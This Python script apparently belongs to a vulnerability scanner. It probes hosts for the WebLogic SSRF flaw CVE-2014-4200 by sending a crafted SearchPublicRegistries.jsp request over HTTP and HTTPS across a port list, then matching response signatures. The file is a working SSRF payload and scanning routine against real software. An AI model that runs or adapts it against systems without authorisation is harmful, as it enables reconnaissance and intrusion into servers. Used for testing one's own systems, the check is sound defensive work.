#coding:utf-8
#!/usr/bin/env 
#CVE-2014-4200(Weblogic_SSRF)

import socket
import ssl
import time
import default_data.dict_ports

payload = '''uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:111111&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'''
socket.setdefaulttimeout(1) 

def check(ip):
    for port in default_data.dict_ports.ports:
        try:
            client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #基于http
            client1.connect((ip,int(port)))
            client1.sendall('''GET /{} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\r\n'''.format(payload,ip,port))

            buf1 = ""                                                    # 重要 ！！！ 接收分块传输数据包
            buf = "1"
            while len(buf):
                try:
                    #print buf
                    buf1 = buf1 + buf
                    buf = client1.recv(1024)
                except socket.error as e:
                    break
            #print buf1                                                  #将接收到的分块传输包，汇总到buf1，输出（此处调试使用）

            if "port out of range:111111" in buf1 or "Deploying Application" in buf1 or "Search public registries" in buf1:
                return ip,port
            client1.close()
        except socket.error as e:
            pass
        
        try:
            client2 = ssl.wrap_socket(socket.socket())                   #基于https
            client2.connect((ip,int(port)))
            client2.sendall('''GET /{} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\r\n'''.format(payload,ip,port))

            buf1 = ""
            buf = "1"
            while len(buf):
                try:
                    buf1 = buf1 + buf
                    buf = client2.recv(1024)
                except socket.error as e:
                    break
                
            if "port out of range:111111" in buf1 or "Deploying Application" in buf1 or "Search public registries" in buf1:
                return ip,port
            client2.close()
        except socket.error as e:
            pass
       
if __name__=='__main__':
    check('192.168.2.110')

